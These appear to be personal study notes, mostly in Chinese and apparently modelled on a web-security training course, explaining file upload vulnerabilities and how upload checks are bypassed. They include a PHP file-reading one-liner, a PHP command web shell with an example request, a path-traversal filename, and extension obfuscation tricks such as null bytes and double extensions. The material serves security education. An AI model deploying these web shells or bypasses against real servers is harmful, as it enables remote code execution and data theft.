# What are file upload vulnerabilities?

文件上传漏洞是指当Web服务器允许用户向其文件系统上传文件时，未能充分验证文件名，类型，内容或大小等信息。若未能对这些方面实施适当的限制，则意味着即便时基础的照片上传功能，也可能被用于上传任意且潜在危险的文件。这些文件甚至可能包含服务器端脚本文件，从而导致远程代码执行。

在某些情况下，上传文件的行为本身就足以造成损害。其他攻击可能涉及后续的HTTP请求，通常时为触发服务器执行该文件。

# What  is the impact of file upload vulnerabilities?

## 文件上传漏洞的影响通常取决于两个关键因素：

- 网站未能正确验证文件的哪个方面，无论是文件大小，类型，内容等。
- 文件成功上传之后会受到哪些限制？

#### 文件类型：
在最坏的情况下，文件类型未经过正确验证，且服务器配置允许某些类型的文件（如 `.php` 和 `.jsp` )被作为代码执行。此时攻击者可能上传具有 Web Shell功能的服务器端代码文件，从而获得对服务器的完全控制权。

#### 文件名：
若文件名验证机制存在缺陷，攻击者仅需上传同名文件即可覆盖关键文件。若服务器同时存在目录遍历漏洞，攻击者甚至能将文件上传至未预期的位置。

#### 文件大小：
未能确保文件大小在阈值范围内，也可能导致一种拒绝服务（DoS）攻击，攻击者通过占满可用磁盘空间来实施攻击。


# How do file upload vulnerabilities arise?

鉴于风险相当明显，现实中网站极少对用户上传文件完全不设限制。更常见的情况是，开发者实施了他们认为稳健的验证机制，但这些机制要么存在固有缺陷，要么能轻易被绕过。

##### 例如：
他们试图将危险文件类型列入黑名单，却未能在检查文件扩展名的时候考虑解析差异。与任何黑名单一样，也容易无意中遗漏那些仍具有危险性的冷门文件类型。

在其他情况下，网站可能会尝试通过验证文件属性来检查文件类型，而攻击者可以利用burp proxy或repeater等工具轻易篡改这些属性。

最终，即使是强大的验证措施，也可能在构成网站的主机和目录网络中有用不一致，从而导致可被利用的差异。


# How do web servers handle requests for static files?

在探讨如何利用文件上传漏洞之前，需要先了解**服务器如何处理静态文件请求的基本原理：**

历史上，网站几乎都是由静态文件构成，这些文件会在用户请求时被提供给用户。
因此，每个被请求的路径都能与服务器文件系统中的目录和文件层次结构1：1映射。如今，网站日益动态化，请求路径往往与文件系统毫无直接关联。尽管如此，web服务器仍需处理某些静态文件的请求，包括样式表，图像等。

处理这些静态文件的过程基本保持不变。服务器会在某个环境解析请求中的路径以识别文件扩展名，进而通过预先配置的扩展名和MIME类型映射表进行对比，从而确定所请求文件的类型。后续操作将根据文件类型和服务器配置而定：
- 如果该文件类型是非可执行文件（例如图像或静态HTML页面），服务器可能仅通过HTTP响应将文件内容发送给客户端。
- 如果文件类型是可执行文件（例如PHP文件），且服务器已配置为执行此类文件，则在运行脚本前，服务器会根据HTTP请求中的头信息和参数分配变量。随后，生成的输出结果将通过HTTP响应发送至客户端。
- 若文件类型为了执行文件，但服务器未配置执行此类文件，通常会返回错误响应。然而在某些情况下，文件内容仍可能以纯文本形式提供给客户端。此类配置错误偶尔会被利用来泄露源代码以及其他敏感信息。
关于敏感信息的泄露方式：去看——information disclosure

# 利用无限制文件上传部署web shell


从安全角度来说，最糟糕的情况莫过于网站允许用户上传服务器脚本（PHP,JavaScript，python文件），且配置为将其作为代码执行。这使得在服务器上创建自己的web shell变得轻而易举。

若能成功上传web shell，便实质上获得了对服务器的完全控制权。这意味着你可以读写任意文件，窃取敏感数据，甚至利用该服务器作为跳板，对内部基础设施及网络外的服务器发起攻击。

例如：
以下PHP单行代码即可用于读取服务器文件系统中的任意文件。
```
<?php echo file_get_contents('/path/to/target/file'); ?>
```
上传之后，向该恶意文件发送请求将返回目标文件的内容作为响应。

一个功能更强大的web shell 如下所示：
```
<?php echo system($_GET['command']); ?>
```
此脚本允许你通过查询参数传递任意系统命令，具体如下：
```
GET /example/exploit.php?command=id HTTP/1.1
```

# 利用文件上传验证机制的漏洞


在现实世界中，几乎是不可能遇到像上个LAB一样的完全没有文件上传防护的网站，但即便存在防护措施，也并不意味着它们足够牢固。有时候你仍能利用这些机制中的漏洞获取Web Shell,从而实现远程代码执行。

## 文件类型验证缺陷

提交HTML表单的时候，浏览器通常会通过POST请求发送数据，其内容类型为 `application/x-www-form-urlencoded`。这种方式适用于发送姓名或地址等简单文本，但不适合传输大量二进制数据（例如完整图像文件或PDF文档）。此时应优先使用 `multipart/form-data` 内容类型。



#### 例如：
假设有一个表单，包含上传照片，提供照片描述以及输入用户名的字段。提交此类表单可能会产生类似以下格式的请求：
```
POST /images HTTP/1.1 
	Host: normal-website.com 
	Content-Length: 12345 
	Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456 ---------------------------012345678901234567890123456 
	Content-Disposition: form-data; name="image"; filename="example.jpg" 
	Content-Type: image/jpeg 
	[...binary content of example.jpg...]
	---------------------------012345678901234567890123456 
	Content-Disposition: form-data; name="description" 
	This is an interesting description of my image. 
	---------------------------012345678901234567890123456 
	Content-Disposition: form-data; name="username" 
	wiener ---------------------------012345678901234567890123456--
```

消息正文被拆分为多个独立部分，分别对应表单中的每个输入字段。每个部分都包含一个 **Content-Disposition**标头，用于告知服务器通过该输入字段提交的数据的**MIME类型**。

网站验证文件上传的一种方式是检查该输入特有的 **Content-Type**标头是否与**预期的MIME类型**匹配.

> 例如，若服务器仅预期接收图像文件，则可能仅允许 image/jpeg 和 image/png 等类型。

问题在于服务器会**隐式信任该标头的值**。若未进一步验证文件内容是否与预设MIME类型匹配，攻击者便可通过burp repeater等工具轻易绕过此防御机制。

## 防止在用户可访问目录中执行文件

虽然从源头阻止危险文件类型上传显然更为理想，但第二道防线是：**阻止服务器执行任何成功绕过防护的脚本。**

文件目录：服务器上的文件夹
```
/var/www/html/              ← 网站根目录
    index.php
    login.php
    static/
        images/
        css/
        js/
    uploads/                ←（用户可访问、可写）
    admin/

```


作为预防措施，服务器通常只运行那些其MIME类型已被明确配置为可执行的脚本。否则，他们可能会返回某种错误信息，或者在某些情况下，将文件内容作为纯文本提供：
```
GET /static/exploit.php?command=id HTTP/1.1 
Host: normal-website.com 
HTTP/1.1 200 OK 
Content-Type: text/plain  //纯文本
Content-Length: 39 
<?php echo system($_GET['command']); ?>
```

**大多数服务器会把上传目录设为禁止脚本**
例如：

```
/uploads/exploit.php
```
当你访问它的时候，服务器不会运行php,而是把源码直接显示：
```
<?php echo system($_GET['command']); ?>
```
这就会让`web shell`失效。

这种行为本身可能具有潜在价值，因为它可能提供泄露源代码的途径，但它会使创建`web shell`的任何尝试都化成泡影。

此类配置通常因目录而异。用于上传用户提交文件的目录，其权限控制往往远比文件系统中其他位置严格——后者通常被认为是终端用户无法触及的区域。若能找到途径将脚本上传至非用户提交文件目录，服务器最终仍可能运行该脚本。

但是！**不同目录的执行权限不一样**
- /uploads/
允许用户存文件，但是不允许执行脚本
- /var/www/html/
能执行脚本，但是无法把文件上传到这里

所以！攻击者就会想办法：
能不能骗服务器把文件保存到一个 **可执行脚本的目录**

TIPS：
Web服务器通常通过`multipart/form-data` 请求中的`filename` 字段来确定文件的名称及保存位置。
**也就是说：**
如果服务器没有正确过滤：

```
filename="../../../../var/www/html/shell.php"
```
有些脆弱系统真的可能被绕过去，把文件写进能执行的php的目录。
这就是经典的 path traversal漏洞。（后续）
[[Path Traversal]]

## 危险文件类型的黑名单设置不足

防止用户上传恶意脚本的更明显方法之一，是将潜在危险的文件扩展名（如.php）**列入黑名单**。但这种黑名单机制存在根本缺陷——**难以明确所有可能被用于执行代码的文件扩展名**。攻击者有时候会利用鲜为人知的**替代扩展名**（如php5,shtml等）绕过黑名单，这些扩展名仍可能具有可执行性。


### 覆盖服务器配置

服务器通常不会执行文件，除非经过特殊配置。
例如：
在Apache服务器执行客户端请求的PHP文件之前，开发人员可能需要在其 `/etc/apache2/apache2.conf`  文件中添加以下指令：

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so 
AddType application/x-httpd-php .php
```

许多服务器还允许开发者在特定目录内创建特殊配置文件，以便覆盖或补充一项或多项全局设置。
例如：
Apache服务器会记载名为 `.htaccess` 的文件（若存在）来实现目录专属配置。

同样的，开发人员可以在`IIS`服务器上通过 `web.config` 文件进行目录特定配置。这可能包含如下指令，例如本例中允许向用户提供 JSON 文件：
```
<staticContent> 
	<mimeMap fileExtension=".json" mimeType="application/json" /> 
	</staticContent>
```

Web服务器在存在此类配置文件的时候会使用它们，但通常不允许通过HTTP请求访问这些文件。不过，偶尔会遇到无法阻止用户上窜恶意配置文件的服务器。这种情况下，即使所需文件的扩展名以及列入黑名单，仍有可能**诱使服务器将任何自定义文件扩展名**映射为可执行MIME类型。

### 混淆文件扩展名

即便是最详尽的黑名单，也可能被经典的混淆技术绕过。

假设验证码代码分大小写，未能识别 `exploit.pHp` 实际上是 `.php` 文件。若后续将文件扩展名映射为MIME类型的代码不区分大小写，这种差异便允许恶意PHP文件嵌入验证环节，最终可能被服务器执行。

你也可以通过以下方法实现类似效果：

- 提供多个扩展名。根据解析文件名的算法，以下文件可能被解释为PHP文件或JPG图像：
`exploit.php.jpg`

- 添加尾随字符。某些组件会剥离或忽略尾随空格，点等符号：
`exploit.php.`

- 尝试对点号，正斜杠和反斜杠使用URL编码（或双重URL编码）。若在验证文件扩展名时未解码该值，但后续在服务器端被解码，则可上传本会被拦截的恶意文件
`exploit%2Ephp`

- 在文件扩展名前添加分号或URL编码的空字节。若验证逻辑采用PHP或Java等高级语言编写，而服务器却通过C/C++等低级语言函数处理文件，则可能导致文件名结尾的判定出现差异：
例如：
`exploit.asp;.jpg` 与 `exploit.asp%00.jpg` 的处理结果可能不同。

- 尝试使用多字节Unicode字符，这些字符在Unicode转换或规范化后可能被转换为空字节和点。例如：
文件名 `xC0 x2E` ,`xC4 xAE` ,`xC0 xAE` 在解析为UTF-8字符串之后可能被转换为 `x2E` ,但随后在用于路径时会被转换为ASCLL字符。

其他防御措施包括剥离或替换危险的扩展名，以阻止文件被执行。若此转换未递归应用，可将禁止字符串置于特定位置，使其被移除之后仍保留有效的文件扩展名。例如，考虑从以下文件名中移除
`.php` 会发生什么：
```
exploit.p.phphp
```
这只是众多混淆文件扩展名的方法中的一小部分。

#### 文件内容验证存在缺陷

更安全的服务器不会默认信任请求中指定的 `Content-Type` ，而是尝试验证文件内容是否与预期一致。

在图像上传功能中，服务器可能会尝试验证图像的某些固有属性，例如其尺寸。

例如：若尝试上传PHP脚本，该文件根本不具备任何尺寸属性。因此服务器可据此判断其不可能是图像，并相应的拒绝上传请求。

同样的，某些文件类型可能始终在其头部或尾部包含特定的字节序列。这些序列可能作为指纹或签名使用，用于判断内容是否符合预期类型。

例如，JPRG文件始终以字节序列 `FF D8 FF` 开头。

这是一种更可靠的文件类型验证方式，但即便如此也并非万无一失。借助特殊工具（如ExifTool），创建包含恶意代码的混杂JPEG文件（将恶意代码植入元数据）变得轻而易举。

#### 利用文件上传竞态条件

现代框架在抵御此类攻击方面更为成熟。它们通常不会将文件直接上传至文件系统中的目标位置，而是采取预防措施：先上传至临时隔离目录，并随机化文件名以避免覆盖现有文件。随后对临时文件进行验证，仅在确认安全后才将其传输到目标位置。



但是，开放者有时候会独立于任何框架自行实现文件上传处理逻辑。这种做法不仅实现起来相当复杂，还可能引入危险的竞争条件，使攻击者能够绕过最严密的验证机制。

例如：

某些网站会将文件直接上传至主文件系统，若验证失败则立即删除。此类行为常见于依赖杀毒软件等工具检测恶意软件的网站。虽然整个过程仅需几毫秒，但在文件存在于服务器的那短暂时间内，攻击者仍有可能执行该文件。

这些漏洞往往及其隐蔽，在黑盒测试中难以被发现，除非能设法泄露相关源代码。

##### 基于URL的文件上传中的竞态条件

在允许通过提供URL上传文件的函数中，也可能出现类似的竞争条件。这种情况下，服务器必须先通过互联网获取文件并创建本地副本，才能执行任何验证操作。

由于文件是通过HTTP加载的，开发人员无法使用其框架内置的机制来安全的验证文件。相反，它们可能需要手动创建自己的流程来临时存储和验证文件，这可能无法达到完全的安全性。
